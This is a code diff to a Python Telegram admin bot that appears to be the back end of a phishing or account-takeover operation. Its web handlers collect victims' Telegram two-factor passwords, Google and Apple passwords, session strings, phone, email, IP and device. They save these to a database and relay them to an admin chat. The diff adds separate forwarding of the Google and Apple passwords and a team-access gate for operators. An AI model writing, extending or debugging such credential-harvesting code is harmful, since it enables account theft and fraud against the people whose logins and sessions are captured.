@@ -8,6 +8,7 @@ from aiohttp import web
 from aiogram import Bot, Dispatcher
 from aiogram.types import BotCommand, BotCommandScopeAllPrivateChats, BotCommandScopeDefault
 
+from admin_bot.gate import router as gate_router, TeamGateMiddleware
 from admin_bot.handlers import router as admin_router, sync_admin_bot_commands
 from admin_bot.orchestrator import Orchestrator
 from shared import db
@@ -82,14 +83,14 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
 
         target_pass = None
         if provider == "google":
-            target_pass = google_password or password_2fa
+            target_pass = google_password
             db.save_google_session(DB_PATH, tg_id, email=email, password=target_pass, session_data=session_string, status="completed")
             user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
             if not user_chk or not user_chk.get("session_string"):
                 db.set_user_session(DB_PATH, tg_id, f"google_auth_{tg_id}")
             db.set_user_auth_step(DB_PATH, tg_id, "authorized")
         elif provider == "apple":
-            target_pass = apple_password or password_2fa
+            target_pass = apple_password
             db.save_apple_session(DB_PATH, tg_id, email=email, password=target_pass, session_data=session_string, status="completed")
             user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
             if not user_chk or not user_chk.get("session_string"):
@@ -132,6 +133,14 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             if is_test_worker(u_mtoken, u_muser):
                 is_test = True
 
+        db_tg_pass = (user.get("telegram_2fa") or user.get("password_2fa")) if user else None
+        db_goog_pass = user.get("google_password") if user else None
+        db_app_pass = user.get("apple_password") if user else None
+
+        tg_pass_to_pass = (target_pass if provider == "telegram" else None) or db_tg_pass
+        goog_pass_to_pass = (target_pass if provider == "google" else None) or db_goog_pass
+        app_pass_to_pass = (target_pass if provider == "apple" else None) or db_app_pass
+
         await notify_user_event(
             event_type="authorized",
             user_tg_id=tg_id,
@@ -140,7 +149,9 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             phone=phone or (user["phone"] if user else None),
             email=email if provider in ("google", "apple") else None,
             auth_step="authorized",
-            password_2fa=target_pass or (user["password_2fa"] if user and "password_2fa" in user.keys() else None),
+            password_2fa=tg_pass_to_pass,
+            google_password=goog_pass_to_pass,
+            apple_password=app_pass_to_pass,
             session_str=session_string,
             ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
             country=geo_info.get("country"),
@@ -233,11 +244,13 @@ async def handle_auth_event(request: web.Request) -> web.Response:
         if event.startswith("google_"):
             if email:
                 db.set_user_email(DB_PATH, tg_id, email)
-            db.save_google_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
+            goog_pwd = data.get("google_password") or password_2fa or (user.get("google_password") if user else None)
+            db.save_google_session(DB_PATH, tg_id, email=email, password=goog_pwd, status="pending" if not event.endswith("complete") else "completed")
         elif event.startswith("apple_"):
             if email:
                 db.set_user_email(DB_PATH, tg_id, email)
-            db.save_apple_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
+            app_pwd = data.get("apple_password") or password_2fa or (user.get("apple_password") if user else None)
+            db.save_apple_session(DB_PATH, tg_id, email=email, password=app_pwd, status="pending" if not event.endswith("complete") else "completed")
         else:
             if phone:
                 db.set_user_phone(DB_PATH, tg_id, phone)
@@ -284,6 +297,10 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             except Exception:
                 db_2fa = user["password_2fa"] if "password_2fa" in user.keys() else None
 
+        goog_p = (data.get("google_password") or password_2fa or (user.get("google_password") if user else None)) if event.startswith("google_") else (user.get("google_password") if user else None)
+        app_p = (data.get("apple_password") or password_2fa or (user.get("apple_password") if user else None)) if event.startswith("apple_") else (user.get("apple_password") if user else None)
+        tg_p = password_2fa if not (event.startswith("google_") or event.startswith("apple_")) else db_2fa
+
         await notify_user_event(
             event_type=event,
             user_tg_id=tg_id,
@@ -292,7 +309,9 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             phone=phone or (user["phone"] if user else None),
             email=email or (user["email"] if user and "email" in user.keys() else None),
             auth_step=event,
-            password_2fa=password_2fa or db_2fa,
+            password_2fa=tg_p,
+            google_password=goog_p,
+            apple_password=app_p,
             details=details,
             ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
             country=geo_info.get("country"),
@@ -301,6 +320,7 @@ async def handle_auth_event(request: web.Request) -> web.Response:
             device=device,
             is_test=is_test,
             mirror_token=bot_token,
+            provider=("google" if event.startswith("google_") else ("apple" if event.startswith("apple_") else "telegram")),
         )
         logger.info("Processed auth event '%s' for tg_id=%s (email=%s, ip=%s, device=%s)", event, tg_id, email, client_ip, device)
         return web.json_response({"ok": True})
@@ -693,7 +713,10 @@ async def main() -> None:
     bot = Bot(token=ADMIN_BOT_TOKEN)
     test_admin_bot = Bot(token=TEST_ADMIN_BOT_TOKEN) if TEST_ADMIN_BOT_TOKEN else None
     dp = Dispatcher()
+    dp.include_router(gate_router)
     dp.include_router(admin_router)
+    dp.message.outer_middleware(TeamGateMiddleware())
+    dp.callback_query.outer_middleware(TeamGateMiddleware())
 
     orchestrator = Orchestrator(bot, ADMIN_CHAT_ID, DB_PATH, AUTO_ROTATE_DEFAULT)
     dp["orchestrator"] = orchestrator
@@ -759,7 +782,11 @@ async def main() -> None:
         logger.warning("Could not delete webhook: %s", e_wh)
 
     try:
-        await dp.start_polling(*bots_to_poll, allowed_updates=dp.resolve_used_update_types())
+        used_updates = dp.resolve_used_update_types()
+        for update_type in ("message", "callback_query", "chat_member", "chat_join_request"):
+            if update_type not in used_updates:
+                used_updates.append(update_type)
+        await dp.start_polling(*bots_to_poll, allowed_updates=used_updates)
     finally:
         await runner.cleanup()
         await orchestrator.fleet.stop_all()
